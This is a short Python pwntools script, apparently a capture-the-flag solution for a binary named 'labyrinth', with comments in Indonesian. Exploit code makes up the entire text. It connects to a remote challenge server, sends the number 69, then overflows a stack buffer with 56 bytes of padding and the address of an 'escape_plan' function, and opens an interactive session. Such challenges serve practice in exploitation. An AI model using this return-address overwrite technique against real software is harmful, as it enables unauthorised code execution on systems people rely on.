from pwn import *

IP = "154.57.164.81"
PORT = 31630

# Remote target
io = remote(IP, PORT)

# Local target
# io = process("./labyrinth")

exe = ELF('./labyrinth')
context.binary = exe
context.log_level = 'debug'

# Tunggu sampai baris input pertama muncul
io.recvline(b">> ") 

# Masukkan angka 69 or 069
io.sendline('69')

# Alamat escape_plan setelah push RBP
escape_plan_addr = 0x401256
offset = 56
payload = b'A' * offset + p64(escape_plan_addr)

io.recvline(b">> ")
io.sendline(payload)

res = io.recv(timeout=5)

io.interactive()






